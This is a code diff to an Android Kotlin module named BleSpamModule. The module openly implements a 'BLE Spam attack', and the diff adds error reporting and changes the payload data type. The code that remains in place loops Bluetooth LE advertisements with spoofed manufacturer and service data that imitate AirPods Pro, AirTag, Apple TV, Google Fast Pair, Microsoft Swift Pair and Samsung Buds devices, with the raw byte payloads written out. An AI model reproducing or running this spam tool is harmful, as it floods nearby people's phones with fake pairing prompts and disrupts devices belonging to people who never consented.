@@ -19,7 +19,7 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.launch
-import java.util.UUID
+import kotlin.coroutines.cancellation.CancellationException
 
 /**
  * Data class representing a payload for the BLE Spam attack.
@@ -28,14 +28,14 @@ import java.util.UUID
  * @property name A descriptive name for the payload (e.g., "AirPods Pro").
  * @property manufacturerId The Bluetooth SIG Manufacturer ID (e.g., 0x004C for Apple).
  * @property serviceUuid The Service UUID if the protocol relies on it (e.g., Google Fast Pair).
- * @property data The raw byte array to be included in the Manufacturer Data or Service Data field.
+ * @property data The raw bytes to be included in the Manufacturer Data or Service Data field.
  */
 data class SpamPayload(
     val type: PayloadType,
     val name: String,
     val manufacturerId: Int? = null,
     val serviceUuid: ParcelUuid? = null,
-    val data: ByteArray = byteArrayOf()
+    val data: List<Byte> = emptyList()
 )
 
 /**
@@ -69,6 +69,10 @@ class BleSpamModule(private val context: Context) {
     private val _isAdvertising = MutableStateFlow(false)
     val isAdvertising: StateFlow<Boolean> = _isAdvertising
 
+    // Error state surfaced to the UI.
+    private val _error = MutableStateFlow<String?>(null)
+    val error: StateFlow<String?> = _error
+
     // Coroutine job to manage the advertising loop.
     private var advertisingJob: Job? = null
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -82,8 +86,17 @@ class BleSpamModule(private val context: Context) {
 
         override fun onStartFailure(errorCode: Int) {
             super.onStartFailure(errorCode)
-            Log.e("BleSpam", "Advertising failed: $errorCode")
-            // Note: Error 1 usually means data too large, Error 2 means too many advertisers.
+            _isAdvertising.value = false
+            val message = when (errorCode) {
+                ADVERTISE_FAILED_DATA_TOO_LARGE -> "Advertising failed: data too large"
+                ADVERTISE_FAILED_TOO_MANY_ADVERTISERS -> "Advertising failed: too many advertisers"
+                ADVERTISE_FAILED_ALREADY_STARTED -> "Advertising failed: already started"
+                ADVERTISE_FAILED_INTERNAL_ERROR -> "Advertising failed: internal error"
+                ADVERTISE_FAILED_FEATURE_UNSUPPORTED -> "Advertising failed: feature unsupported"
+                else -> "Advertising failed: error code $errorCode"
+            }
+            Log.e("BleSpam", message)
+            _error.value = message
         }
     }
 
@@ -94,9 +107,13 @@ class BleSpamModule(private val context: Context) {
      */
     @SuppressLint("MissingPermission")
     fun startSpam(payloadType: PayloadType) {
+        // Clear any previous error.
+        _error.value = null
+
         // Pre-flight check: Is Bluetooth on?
         if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
             Log.e("BleSpam", "Bluetooth not enabled")
+            _error.value = "Bluetooth not enabled"
             return
         }
 
@@ -104,6 +121,7 @@ class BleSpamModule(private val context: Context) {
         advertiser = bluetoothAdapter.bluetoothLeAdvertiser
         if (advertiser == null) {
              Log.e("BleSpam", "BLE Advertiser not available")
+             _error.value = "BLE Advertiser not available"
              return
         }
 
@@ -139,7 +157,7 @@ class BleSpamModule(private val context: Context) {
 
                     // Add Manufacturer Data (used by Apple/Microsoft/Samsung).
                     payload.manufacturerId?.let {
-                        dataBuilder.addManufacturerData(it, payload.data)
+                        dataBuilder.addManufacturerData(it, payload.data.toByteArray())
                     }
 
                     // Add Service UUID (used by Google Fast Pair).
@@ -147,7 +165,7 @@ class BleSpamModule(private val context: Context) {
                         dataBuilder.addServiceUuid(it)
                         // Some protocols put the payload in Service Data instead of Manufacturer Data.
                         if (payload.data.isNotEmpty() && payload.manufacturerId == null) {
-                             dataBuilder.addServiceData(it, payload.data)
+                             dataBuilder.addServiceData(it, payload.data.toByteArray())
                         }
                     }
 
@@ -168,7 +186,9 @@ class BleSpamModule(private val context: Context) {
                         // Short gap to avoid congestion.
                         delay(50)
                     } catch (e: Exception) {
+                        if (e is CancellationException) throw e
                         Log.e("BleSpam", "Error in spam loop", e)
+                        _error.value = "Spam loop error: ${e.message}"
                     }
                 }
             }
@@ -186,6 +206,10 @@ class BleSpamModule(private val context: Context) {
         advertisingJob?.cancel()
         advertisingJob = null
         stopSpamInternal()
+    }
+
+    fun clearError() {
+        _error.value = null
     }
 
     fun close() {
@@ -212,23 +236,23 @@ class BleSpamModule(private val context: Context) {
         return when (type) {
             PayloadType.APPLE_CONTINUITY -> listOf(
                 // Apple - Airpods Pro spoof
-                SpamPayload(type, "AirPods Pro", manufacturerId = 0x004C, data = byteArrayOf(0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa.toByte(), 0x30, 0x01, 0x00, 0x00, 0x45, 0x2d, 0x3a, 0x05, 0x25, 0x45, 0xce.toByte(), 0x93.toByte(), 0x9c.toByte(), 0x24, 0x12, 0x6e, 0x3d)),
+                SpamPayload(type, "AirPods Pro", manufacturerId = 0x004C, data = byteArrayOf(0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa.toByte(), 0x30, 0x01, 0x00, 0x00, 0x45, 0x2d, 0x3a, 0x05, 0x25, 0x45, 0xce.toByte(), 0x93.toByte(), 0x9c.toByte(), 0x24, 0x12, 0x6e, 0x3d).toList()),
                 // Apple - AirTags (Simplified)
-                SpamPayload(type, "AirTag", manufacturerId = 0x004C, data = byteArrayOf(0x12, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)),
+                SpamPayload(type, "AirTag", manufacturerId = 0x004C, data = byteArrayOf(0x12, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00).toList()),
                 // Apple - Apple TV Setup
-                SpamPayload(type, "Apple TV", manufacturerId = 0x004C, data = byteArrayOf(0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1.toByte(), 0x01, 0x60, 0x4c, 0x95.toByte(), 0x00, 0x00, 0x10, 0x00, 0x00, 0x00))
+                SpamPayload(type, "Apple TV", manufacturerId = 0x004C, data = byteArrayOf(0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1.toByte(), 0x01, 0x60, 0x4c, 0x95.toByte(), 0x00, 0x00, 0x10, 0x00, 0x00, 0x00).toList())
             )
             PayloadType.GOOGLE_FAST_PAIR -> listOf(
                 // Generic Google Fast Pair trigger
-                SpamPayload(type, "Google Fast Pair", serviceUuid = ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"), data = byteArrayOf(0x00, 0x00, 0x00, 0x00, 0x00, 0x00))
+                SpamPayload(type, "Google Fast Pair", serviceUuid = ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"), data = byteArrayOf(0x00, 0x00, 0x00, 0x00, 0x00, 0x00).toList())
             )
             PayloadType.MICROSOFT_SWIFT_PAIR -> listOf(
                 // Microsoft Swift Pair (Simplified) - 0x0006 is Microsoft's ID
-                SpamPayload(type, "Swift Pair", manufacturerId = 0x0006, data = byteArrayOf(0x03, 0x00, 0x80.toByte()))
+                SpamPayload(type, "Swift Pair", manufacturerId = 0x0006, data = byteArrayOf(0x03, 0x00, 0x80.toByte()).toList())
             )
-             PayloadType.SAMSUNG_EASY_SETUP -> listOf(
+            PayloadType.SAMSUNG_EASY_SETUP -> listOf(
                 // Samsung - 0x0075 is Samsung's ID
-                SpamPayload(type, "Samsung Buds", manufacturerId = 0x0075, data = byteArrayOf(0x42, 0x09, 0x81.toByte(), 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09))
+                SpamPayload(type, "Samsung Buds", manufacturerId = 0x0075, data = byteArrayOf(0x42, 0x09, 0x81.toByte(), 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09).toList())
             )
         }
     }
